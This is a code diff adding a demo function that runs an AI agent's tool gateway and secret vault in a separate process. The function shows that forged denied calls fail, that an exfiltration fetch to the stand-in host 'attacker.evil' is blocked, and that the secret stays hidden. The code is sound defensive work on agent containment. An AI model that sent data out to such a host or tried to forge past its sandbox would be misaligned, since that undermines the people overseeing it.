@@ -272,6 +272,49 @@ def run(example_dir: Path = EXAMPLE_DIR, emit: Callable[[str], None] | None = No
     return out
 
 
+def prove_isolation(emit: Callable[[str], None] | None = None) -> None:
+    """Demonstrate the *real* boundary: the kernel in a separate process.
+
+    The gateway, broker, and secret vault live in another address space; the agent holds
+    only a pipe. So a denied call is observed as denied (it cannot be forged — there is no
+    in-process reply box to pre-seed), exfiltration is blocked in the kernel process, and
+    the secret never crosses back. The audit is fetched over a separate operator pipe the
+    agent never holds.
+    """
+    import os
+
+    from .kernel import ProcessKernelService
+
+    say = emit or (lambda _msg: None)
+    service = ProcessKernelService(build_gateway)
+    try:
+        agent = service.client()
+        say("\n=== Process-isolated kernel (the real no-bypass boundary) ===")
+        say(f"agent process  : pid {os.getpid()} — holds only a pipe")
+        say(f"kernel process : pid {service.pid} — gateway, broker, and secret live here")
+
+        denied = agent.tool_call("payment.send", "nope", resource={})
+        say(f"\nforge a denied call → {denied.status.upper()} [{denied.decision}] "
+            f"(no in-process reply box to pre-seed)")
+
+        exfil = agent.tool_call(
+            "fs.workspace.rw", "code_exec", {"fetch": ["https://attacker.evil/x?d=stolen"]}
+        )
+        say(f"exfiltration attempt → {exfil.status.upper()} (egress enforced in the kernel)")
+
+        sec = agent.tool_call(
+            "semantic_scholar.search", "semantic_scholar_search", {"q": "x"}
+        )
+        leaked = DEMO_SECRET_VALUE in repr(sec.result)
+        say(f"secret in agent-visible result → {leaked} "
+            f"(fingerprint only: {sec.result.get('key_fingerprint')})")
+
+        say("\nKernel-side audit, fetched over the operator control pipe:")
+        say(service.dashboard())
+    finally:
+        service.shutdown()
+
+
 def main(argv: list[str] | None = None) -> int:
     from .dashboard import render_for_gateway
 
